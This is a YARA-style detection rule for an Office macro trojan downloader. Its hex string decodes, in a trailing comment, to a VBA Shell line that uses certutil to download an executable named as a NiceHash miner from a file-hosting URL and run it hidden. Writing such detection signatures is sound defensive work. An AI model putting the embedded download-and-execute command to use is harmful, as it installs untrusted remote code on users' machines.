
rule TrojanDownloader_O97M_EncDoc_KAI_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.KAI!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 73 3a 2f 2f 77 77 77 2e 6d 65 64 69 61 66 69 72 65 2e 63 6f 6d 2f 66 69 6c 65 2f 37 7a 68 63 70 30 6e 74 34 64 73 33 67 6b 6a 2f 4e 69 63 65 48 61 73 68 51 75 69 63 6b 4d 69 6e 65 72 56 31 30 30 33 2e 65 78 65 2f 66 69 6c 65 22 22 20 5a 74 64 7a 6b 74 6a 62 2e 65 78 65 2e 65 78 65 20 26 26 20 5a 74 64 7a 6b 74 6a 62 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29 } //00 00  = Shell("cmd /c certutil.exe -urlcache -split -f ""https://www.mediafire.com/file/7zhcp0nt4ds3gkj/NiceHashQuickMinerV1003.exe/file"" Ztdzktjb.exe.exe && Ztdzktjb.exe.exe", vbHide)
	condition:
		any of ($a_*)
 
}